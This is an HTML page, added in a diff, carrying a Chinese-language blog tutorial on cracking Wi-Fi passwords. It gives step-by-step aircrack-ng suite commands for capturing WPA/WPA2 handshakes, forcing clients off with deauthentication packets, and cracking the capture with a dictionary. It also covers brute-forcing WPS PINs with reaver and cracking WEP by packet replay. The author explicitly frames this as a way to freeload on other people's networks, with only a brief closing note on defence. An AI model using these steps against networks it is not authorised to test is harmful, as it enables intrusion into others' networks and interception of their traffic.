@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://jenihk.github.io/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://jenihk.github.io/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://jenihk.github.io/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://jenihk.github.io/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://jenihk.github.io/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://jenihk.github.io/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://jenihk.github.io/wificrack.html">
+	<meta property="og:title" content="wifi 破解">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://jenihk.github.io/theme/images/posts/wificrack/cover.png">
+	<meta property="article:published_time" content="2016-11-02 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://jenihk.github.io/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://jenihk.github.io/category/an-quan.html">安全</a></li>
+                        <li><a href="https://jenihk.github.io/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://jenihk.github.io/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('theme/images/posts/wificrack/cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>wifi 破解</h1>
+                        <span class="meta">Posted by
+                                <a href="https://jenihk.github.io/author/jeni.html">JenI</a>
+                             on 2016-11-02 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>由于近几年智能移动设备的普及和发展，大家对无线网的需求变得越来越大，尽管手机等设备可以通过数据流量上网，但是毕竟流量费还没低到我们可以放肆玩耍的地步，wifi仍然是大多数“网瘾少年”的首选。所以，掌握wifi破解技术还是很有必要的，尽管蹭网并不是什么光彩的事，而且伴有安全隐患，不过有些网络资源一直被闲置，我们借用一下也算是对社会资源的充分利用嘛......好吧，我承认这都是借口，但是没关系，只要我们不干坏事，偶尔蹭个网用也不为过。</p>
+<p>先来介绍一下wifi的几种加密方式</p>
+<p><strong><em>加密方式</em></strong></p>
+<ul>
+<li>
+<p>WEP加密方式现在基本上已经看不到了，主要原因是由于它的加密体制存在缺陷，通过收集足够的数据包，可以直接还原出密码，所以使用这种加密方式并不安全。</p>
+</li>
+<li>
+<p>WPA/WPA2是现在被广泛使用的加密方式，也就是我们日常生活中最常见的加密方式。采用这种加密方式时，只要密码的复杂度足够高，是很难被破解的。目前这种加密方式唯一的破解方式是枚举,除非它开启了 WPS。</p>
+</li>
+</ul>
+<p><strong><em>环境</em></strong></p>
+<p>不管你是 Windows 还是 Linux，首先要保证你的系统或虚拟机系统可以识别你的无线网卡，如果是物理机系统的话可以直接使用笔记本内置的无线网卡，如果是虚拟机的话需要单独买一个支持监听功能的无线网卡，十几到几十元不等，然后在系统内安装针对该网卡芯片的驱动。</p>
+<p>破解需要用到 Aircrack-ng 软件，它是一款用于破解无线802.11WEP及WPA-PSK加密的工具，该工具在2005年11月之前名字是Aircrack，在其2.41版本之后才改名为Aircrack-ng。对于无线安全人员而言，Aircrack-ng也是一款必备的无线安全检测工具，它可以帮助管理员进行无线网络密码的脆弱性检查及了解无线网络信号的分布情况，非常适合对企业进行无线安全审计时使用。</p>
+<p>根据自己的系统自行安装 Aircrack-ng 工具，该工具为一个套件。套件内包含 aircrack-ng、airdecap-ng、airmon-ng、aireplay-ng、airodump-ng、airtun-ng
+、airolib-ng、packetforge-ng、Tools、airbase-ng、airdecloak-ng、airdriver-ng、airolib-ng、airserv-ng、buddy-ng、easside-ng、tkiptun-ng、wesside-ng</p>
+<p>下列操作在 Linux 上实现，window操作类似。</p>
+<p><strong><em>WPA/WPA2破解方法</em></strong></p>
+<p>首先我在另一台电脑上使用无线网卡模拟了一个 AP 环境，把它作为本次实验的目标，也就是我们需要破解的无线网。下图为该网络的信息</p>
+<p><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/tp-link.png" alt="tp-link" /></p>
+<p>执行破解步骤</p>
+<ol>
+<li>
+<p>载入无线网卡<br />
+首先查看无线网卡是否激活
+<pre>
+ifconfig
+</pre><br />
+如果没有看到自己的无线网卡，执行
+<pre>
+ifconfig -a
+</pre><br />
+驱动正常的情况下应该会显示出自己的网卡名，比如 wlan0 这种，我这里是 wlp4s0，使用如下命令激活无线网卡
+<pre>
+sudo ifconfig wlp4s0 up
+</pre>
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-1.png" alt="aircrack-1" /></p>
+</li>
+<li>
+<p>开启监听模式,监听模式下适配器名称会变更，比如我的变成了 wlp4s0mon
+<pre>
+sudo airmon-ng start wlp4s0
+</pre><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-2.png" alt="aircrack-2" /><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-3.png" alt="aircrack-3" /></p>
+</li>
+<li>
+<p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
+<pre>
+sudo airodump-ng wlp4s0mon
+</pre><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-4.png"" alt="aircrack-4" /><br />
+记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描,我们的目标是 SoftAP ,所以我们记下 1 这个信道</p>
+</li>
+<li>
+<p>选取要破解的无线网络，开始抓包
+<pre>
+sudo airodump-ng -c 1 –w log wlp4s0mon
+# -c 为目标AP的工作频道，我们要进行攻击测试的无线路由器工作频道为1；
+# -w 后跟要保存的文件名，名字随意。要注意的是：这里虽然设置的文件名是log，但是生成的文件却不是log.cap，而是log-01.cap，在进行第二次攻击时，若使用同样文件名log保存的话，就会生成名为log-02.cap的文件。
+</pre><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-5.png" alt="aircrack-5" /></p>
+</li>
+<li>
+<p>打开一个新的终端，发送名叫“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端会自动重新连接无线路由器，我们也可以捕获到包含 WPA-PSK 4次握手验证的数据包了。
+<pre>
+sudo aireplay-ng -0 1 –a 14:CF:92:DB:46:B3 -c CC:3A:61:C9:15:77 wlp4s0mon
+# -0 用aireplay的“0”模式（攻击模式，模拟目标客户端向AP发送重连请求，从而会使目标客户端断开连接），借以捕获握手包。后面的数字可以改为1-10不等，数字越大，攻击次数越多。
+# -a 目标无线网的MAC地址；
+# -c 客户端的MAC地址；
+</pre><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-6.png" alt="aircrack-6" /><br />
+回到 airodump-ng 界面，右上角会出现 “WPA handshake” 的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文</p>
+</li>
+<li>
+<p>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br />
+此时终端所在目录内会有以下文件<br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-7.png" alt="aircrack-7" /><br />
+执行
+<pre>
+sudo aircrack-ng -w blackhat/worldlist1.dic log-01.cap
+# -w 后跟预先制作的字典
+</pre><br />
+<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/aircrack-8.png" alt="aircrack-8" /><br />
+最后记得结束网卡的监听模式
+<pre>
+sudo airmon-ng stop wlp4s0mon
+</pre><br />
+如果如上图显示，则说明找到了密码，如果没有找到密码的话，可以更换字典，再次尝试对cap文件进行密文比对，直到破解成功。所以说 WPA/WPA2 加密方式破解wifi是有一定几率的，成功与否取决于字典是否强大。</p>
+</li>
+</ol>
+<p>但是，如果采用 WPA/WPA2 加密方式的无线网开启了 WPS ,那就可以直接跑 PIN 码破解wifi</p>
+<p>WPS（Wi-Fi Protected Setup，WiFi保护设置）是由Wi-Fi联盟所推出的 Wi-Fi 安全防护设定搜索标准，与之对应的还有一个名词叫 QSS ，QSS又称快速安全设置，顾名思义，它是一种与无线网络进行快速连接的方式。对于一般用户，WPS提供了一个简单的方法与无线路由器进行快速互联，它会随机产生一个八位数字的字符串作为个人识别号码（PIN）进行加密操作。省去了客户端需要连入无线网络时，必须手动添加网络名称（SSID）及输入冗长的无线加密密码的繁琐过程。但方便的同时伴随而来的就是不安全，根据加密特点，pin码最多为10的8次方，这样一个有极限的数字是肯定可以被爆破出来的，只是要以巨大的时间为代价而已。不过不要紧，它的另外两个特性会大大缩短我们破解的时间。第一个特性是这个8位的 PIN 码的最后一位是一个校验和，也就是说，我们只需要破解前7位就可以了。第二个特性是无线路由器会认证这个 PIN 码的前后两部分，前4位与后3位，如果不正确，它返回一个EAP-NACK信息，根据这个信息我们可以判断出这两部分是否正确，这样我们需要枚举的数字就变成了4的10次方加上3的10次方，也就是11000个。换句话说，由于他的这些特性，我们基本可以在一两个小时以内破解出 PIN 码，破解出来后，再使用相关工具连接即可</p>
+<p>知道了原理，再来说说方法</p>
+<p>前面的步骤和使用字典破解是一样的，在开启监听模式后，执行
+<pre>
+sudo wash -i wlp4s0mon -C
+</pre></p>
+<p>如果什么也没有就说明附近没有开启 WPS 的无线路由器，如果有的话，记住该无线网的 BSSID,然后执行（reaver工具需要单独安装）
+<pre>
+reaver -i wlp4s0mon -b 目标网卡的mac地址 -vv -a
+</pre></p>
+<p>之后静静的等待就好了。</p>
+<p><strong><em>WEP破解方法(不是重点，简单介绍)</em></strong></p>
+<ol>
+<li>
+<p>载入无线网卡<br />
+首先查看无线网卡是否激活
+<pre>
+ifconfig
+</pre><br />
+如果没有看到自己的无线网卡，执行
+<pre>
+ifconfig -a
+</pre><br />
+驱动正常的情况下应该会显示出自己的网卡名，比如 wlan0 这种，我这里是 wlp4s0，使用如下命令激活无线网卡
+<pre>
+sudo ifconfig wlp4s0 up
+</pre></p>
+</li>
+<li>
+<p>开启监听模式,监听模式下适配器名称会变更，比如我的变成了 wlp4s0mon
+<pre>
+sudo airmon-ng start wlp4s0
+</pre></p>
+</li>
+<li>
+<p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
+<pre>
+sudo airodump-ng wlp4s0mon
+</pre><br />
+记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描</p>
+</li>
+<li>
+<p>选取了目标之后，输入
+<pre>
+sudo airodump-ng --ivs -w log -c 频道号 wlp4s0mon
+</pre></p>
+</li>
+<li>
+<p>开启一个新的终端，输入
+<pre>
+aireplay-ng -3 -b 目标wifi的mac地址 -h 客户端的mac地址 wlp4s0mon
+</pre></p>
+</li>
+<li>
+<p>IVs 值达到2万以上时，再打开一个终端，使用 aircrack-ng 开始破解 WEP
+<pre>
+sudo aircrack-ng 捕获的 IVs 文件
+</pre></p>
+</li>
+</ol>
+<p>如果不出意外，密码就被破解出来了。但是之前也说过，这种加密方式基本上没有了， 了解一下就可以了</p>
+<p><strong><em>思考</em></strong></p>
+<p>通过上面的实验可以看出现在的无线网络并没有想象中那么安全，如果有人破解出了你无线网的密码，他就可进一步控制你的路由器，甚至对你经由路由器发送的数据进行嗅探，从而获取你的信息。所以如果想让自己拥有一个尽量安全的网络环境，那就把你的wifi密码设置的复杂一点吧。而且，尽量不要在公共场所提供的免费wifi进行购物、付款等设计个人财产的操作，因为很有可能你的信息就被别人抓到了。</p>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'wificrack.html';
+                var disqus_url = 'https://jenihk.github.io/wificrack.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://jenihk.github.io/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://jenihk.github.io/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://jenihk.github.io/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://jenihk.github.io/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
